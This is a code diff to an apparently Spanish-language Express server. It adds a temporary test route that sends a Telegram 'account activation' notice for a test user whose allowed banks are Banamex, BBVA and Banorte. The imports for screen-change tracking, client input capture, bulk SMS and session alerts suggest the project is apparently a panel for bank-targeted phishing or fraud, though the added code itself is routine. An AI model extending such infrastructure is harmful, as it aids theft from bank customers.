@@ -8,6 +8,7 @@ import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, Inse
 import { setupAuth } from "./auth";
 import axios from 'axios';
 import { sendTelegramNotification, sendSessionCreatedNotification, sendScreenChangeNotification, sendFileDownloadNotification } from './telegramService';
+import { sendAccountActivationNotification } from './telegramBot';
 import { sendBulkSMS, parsePhoneNumbers, validateSMSMessage } from './smsService';
 import multer from 'multer';
 import path from 'path';
@@ -2825,6 +2826,41 @@ Tu Chat ID ha sido configurado correctamente por un administrador.
     } catch (error: any) {
       console.error('Error enviando mensaje de administrador:', error);
       res.status(500).json({ success: false, message: error.message });
+    }
+  });
+
+  // Ruta temporal para probar notificaciones de activación
+  app.post("/api/test-activation-notification", async (req, res) => {
+    try {
+      
+      // Usuario de prueba
+      const testUserData = {
+        username: "usuario_prueba",
+        telegramChatId: "987654321",
+        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000), // 1 día
+        allowedBanks: "banamex,bbva,banorte"
+      };
+
+      const result = await sendAccountActivationNotification(testUserData);
+      
+      if (result.success) {
+        res.json({ 
+          success: true, 
+          message: "Notificación de activación enviada correctamente",
+          userData: testUserData
+        });
+      } else {
+        res.status(400).json({ 
+          success: false, 
+          error: result.error 
+        });
+      }
+    } catch (error: any) {
+      console.error("Error en prueba de notificación:", error);
+      res.status(500).json({ 
+        success: false, 
+        error: error.message 
+      });
     }
   });
 
